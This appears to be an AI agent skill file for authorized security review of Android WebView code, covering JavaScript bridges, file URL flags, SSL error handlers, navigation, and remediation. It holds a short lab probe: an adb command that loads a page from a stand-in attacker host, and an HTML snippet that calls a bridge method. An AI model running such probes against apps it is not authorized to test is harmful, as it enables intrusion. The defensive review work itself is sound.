---
name: android-webview-security
description: >
  Authorized Android WebView security review: JavaScript bridges
  (addJavascriptInterface), file URL access, universal access from file URLs,
  mixed content, SSL error handlers, and WebView XSS to native privilege.
  Use when reviewing owned apps, labs, and CTF APKs — not unauthorized third-party apps.
---

# Android WebView Security

Assess **WebView** config and bridges for owned or explicitly authorized apps:
JS↔native interfaces, `file://`/content policy, TLS handlers, navigation.

## Scope And Authorization

- **In scope:** owned apps, authorized assessments, labs, CTF APKs, lab devices.
- **Out of scope:** unauthorized third-party apps; phishing real users; user fleets.
- Record package/version/APK hash. Attacker HTML only on approved lab origins.
- Redact cookies, tokens, secrets, PII. State model: remote URL vs file/XSS vs export.

## Use When

- `WebView` / `WebViewClient` / `WebChromeClient` / `addJavascriptInterface`
- Hybrid load of remote or local HTML with JS enabled
- Bridges may expose files, tokens, intents, or privileged actions
- File/universal access flags enabled; SSL handler proceeds; mixed content open
- Exported Activity / deep link loads attacker-influenced URL into WebView

| Need instead | Skill |
| --- | --- |
| Export / deep-link inventory only | `android-exported-components` |
| Full Android methodology | `android-pentesting-tricks` |
| SSL pinning bypass | `mobile-ssl-pinning-bypass` |
| Classic web XSS detail | `xss-cross-site-scripting` |

## Workflow

### 1. Locate WebView surfaces

```bash
jadx -d derived/jadx app.apk
rg -n -i 'WebView|addJavascriptInterface|setJavaScriptEnabled|setAllowFileAccess|setAllowUniversalAccess|onReceivedSslError|shouldOverrideUrlLoading|loadUrl|loadData|evaluateJavascript' derived/jadx
```

Map: host component (exported?), URL source, JS enabled, bridge names,
file/content/universal access, DomStorage, SSL/navigation overrides.

### 2. JavaScript bridge review

For each `addJavascriptInterface(obj, "Name")`: list `@JavascriptInterface`
methods (API 17+; older minSdk reflection risk); treat as untrusted IPC if page
JS can run. High-risk: file/prefs/DB R/W, return tokens, start components,
shell/dex, blind path/SQL/intent strings. Attacker URL or XSS → native privilege
via bridge is critical; origin-restricted bridges still need tight navigation.

```bash
rg -n -i 'JavascriptInterface|addJavascriptInterface' derived/jadx -A 5
```

### 3. File URL and origin isolation

| Setting | Risk when loose |
| --- | --- |
| JS + `file://` | Local HTML XSS gains script |
| `setAllowFileAccessFromFileURLs(true)` | `file://` may read other files |
| `setAllowUniversalAccessFromFileURLs(true)` | Any-origin from `file://` — severe |
| `setAllowContentAccess` / `loadDataWithBaseURL` | `content://` / SOP origin base |

### 4. Navigation, mixed content, TLS

1. URL overrides: allowlist? `intent://`, `file://`, `content://`, custom schemes.
2. `onReceivedSslError` → `proceed()`: WebView MITM (lab proxy evidence).
3. `MIXED_CONTENT_ALWAYS_ALLOW`; file chooser/geo on attacker pages if open nav.

### 5. Authorized lab proof

```bash
adb shell am start -n com.example.app/.WebActivity -e url 'https://lab-attacker.example/wv.html'
adb logcat | rg -i 'chromium|WebView|Console|JSBridge|com.example.app'
```

```html
<script>
  try { console.log('bridge', Name.sensitiveMethod('canary')); }
  catch (e) { console.log('bridge err', e); }
</script>
```

Lab-controlled `file://` only. Confirm cross-file/https reads if universal
access is on. Chains: export → `android-exported-components`; pins →
`mobile-ssl-pinning-bypass`; storage → `android-pentesting-tricks`.

### 6. Remediation

Disable JS unless required; never universal file access on modern apps. Minimize
bridges; validate args; no secrets returned. Allowlist HTTPS; block unexpected
schemes; no blind SSL `proceed()`; no untrusted Intent URLs. Prefer Custom
Tabs/TWA when bridges are unnecessary. Fixes/tests: `code-quality-standards`.

## Routing

| Situation | Primary | Helper |
| --- | --- | --- |
| WebView bridge, file URLs, SSL/navigation | **This skill** | — |
| Export/deep link feeds WebView URL | `android-exported-components` | this skill |
| Full mobile surface, storage, Frida | `android-pentesting-tricks` | this skill |
| Pinning / proxy MITM | `mobile-ssl-pinning-bypass` | this skill if SSL handler bug |
| Safe remediations and tests | `code-quality-standards` | this skill |

### Required helpers (when applicable)

- **`android-pentesting-tricks`:** APK acquire, lab baseline, storage, dynamic workflow.
- **`mobile-ssl-pinning-bypass`:** plaintext HTTPS despite pins (owned/lab).
- **`code-quality-standards`:** WebView settings, bridges, and tests.

## Checklist

- [ ] Scope/package/version/APK hash; lab-only probes
- [ ] WebView hosts; export and URL source
- [ ] JS, bridges, `@JavascriptInterface` methods
- [ ] File/content/universal access flags
- [ ] Navigation allowlist; SSL handler; mixed content
- [ ] Authorized PoC + attacker model; redacted evidence
- [ ] Remediation + retest; hand-off export / pinning / android-pentesting

## Rules

- Owned/authorized apps and labs only.
- Report settings **plus** attacker model — JS-enabled alone is often low.
- Minimal canaries; no real user data exfil; keep decompile trees derived-only.
---

# Note

Owns **Android WebView** bridges, file URL policy, TLS/mixed handlers, navigation.
Pair with `android-exported-components`, `android-pentesting-tricks`,
`mobile-ssl-pinning-bypass`, and `code-quality-standards`.
